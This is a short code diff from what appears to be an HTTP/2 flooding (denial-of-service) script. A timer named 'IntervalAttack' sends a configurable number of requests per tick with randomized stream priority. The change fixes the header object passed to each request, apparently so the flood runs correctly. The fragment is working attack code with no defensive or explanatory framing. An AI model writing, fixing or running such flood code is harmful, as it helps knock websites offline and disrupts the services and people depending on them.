@@ -260,7 +260,7 @@ let headersbex = {
          bexClient.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const bex = bexClient.request(bexnxx, {
+                    const bex = bexClient.request(headersbex, {
                       weight: Math.random() < 0.5 ? 255 : 220,
                       depends_on: 0,
                       exclusive: Math.random() < 0.5 ? true : false,
